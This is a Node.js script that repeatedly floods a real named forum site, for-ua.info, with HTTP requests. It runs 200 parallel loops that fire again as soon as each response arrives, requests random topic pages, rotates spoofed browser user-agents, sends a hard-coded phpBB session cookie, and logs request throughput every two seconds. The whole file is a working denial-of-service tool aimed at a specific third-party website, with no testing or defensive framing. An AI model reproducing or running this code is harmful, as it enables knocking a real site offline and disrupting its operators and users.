const http = require('http');
const constants = require('../list');
const _ = require('underscore');

var requestsCount = 0;
var loadTimeSum = 0;
var loadDataAmount = 0;

function attack(path) {
  if (!path) {
    path = 'http://for-ua.info/viewtopic.php?t=' + _.random(1, 40000);
  }
  const start = Date.now();
  const req = http.request({
    host: 'for-ua.info',
    path: path,
    headers: {
      'user-agent': constants.browser(),
      'referer': path,
      'cookie': 'phpbb3_dfg23_sid=0d023aa521d3e041beb18633a9c0bef2; phpbb3_dfg23_u=1'
    }
  }, function (res) {
    if ([200, 307, 404].indexOf(res.statusCode) < 0) {
      console.warn(res.statusCode);
    }
    function logResponse() {
      requestsCount++;
      loadTimeSum += Date.now() - start;
      setTimeout(attack, 0)
    }
    // if (307 === res.statusCode) {
    //   logResponse();
    //   attack(res.headers.location);
    // }
    if ('content-length' in res.headers) {
      res.on('data', function(chuck) {
        loadDataAmount += chuck.length
      });
      res.on('end', logResponse);
    }
    else {
      logResponse();
    }
  });
  req.on('error', function (err) {
    console.error('Request error', err);
  });
  req.end();
}

setInterval(function () {
  const time = new Date().toLocaleString();
  const loading = Math.round(loadTimeSum / requestsCount);
  console.log(`# ${time} # ${loading} # ${requestsCount} / ${(loadDataAmount / 1024).toPrecision(5)}`);
  loadTimeSum = 0;
  requestsCount = 0;
  loadDataAmount = 0;
}, 2000);

for (var i = 0; i < 200; i++) {
  setTimeout(attack, i * 20);
}
